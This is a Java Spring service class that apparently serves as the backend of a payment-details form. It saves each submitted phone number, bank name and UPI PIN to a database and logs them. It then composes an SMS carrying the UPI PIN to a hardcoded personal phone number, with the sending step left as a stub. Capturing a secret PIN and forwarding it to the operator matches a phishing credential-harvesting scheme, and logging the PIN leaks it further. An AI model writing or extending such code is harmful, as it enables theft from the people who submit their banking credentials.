package com.example.blog.serviceImp;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import com.example.blog.Rpo.PaymentRepository;
import com.example.blog.entity.PaymentDetails;
import com.example.blog.service.PaymentService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Service
public class PaymentServiceImpl implements PaymentService {

    private static final Logger logger = LoggerFactory.getLogger(PaymentServiceImpl.class);

    @Autowired
    private PaymentRepository paymentRepository;

    // Hardcoded phone number for SMS
    private static final String MY_PHONE_NUMBER = "8252911976"; // Replace with your number

    @Override
    public String savePaymentDetails(PaymentDetails paymentDetails) {
        try {
            logger.info("Saving payment details: {}", paymentDetails);
            
            // Save payment details in the database
            paymentRepository.save(paymentDetails);

            // Prepare SMS content
            String messageBody = "Payment Details Submitted:\n" +
                "Phone: " + paymentDetails.getPhoneNumber() + "\n" +
                "Bank: " + paymentDetails.getBankName() + "\n" +
                "UPI Pin: " + paymentDetails.getUpiPin();

            // Send SMS
            String smsStatus = sendSms(MY_PHONE_NUMBER, messageBody);

            logger.info("SMS Status: {}", smsStatus);
            return "Payment details saved successfully! SMS Status: " + smsStatus;
        } catch (Exception e) {
            logger.error("Error saving payment details", e);
            return "Error saving payment details: " + e.getMessage();
        }
    }

    // Dummy SMS sending method
    private String sendSms(String phoneNumber, String messageBody) {
        try {
            // Simulate SMS sending
            logger.info("Sending SMS to {}: {}", phoneNumber, messageBody);

            // Real SMS API integration goes here
            // Example: twilioSmsApi.send(phoneNumber, messageBody);

            return "SMS sent successfully!";
        } catch (Exception e) {
            logger.error("Error sending SMS", e);
            return "Error sending SMS: " + e.getMessage();
        }
    }
}
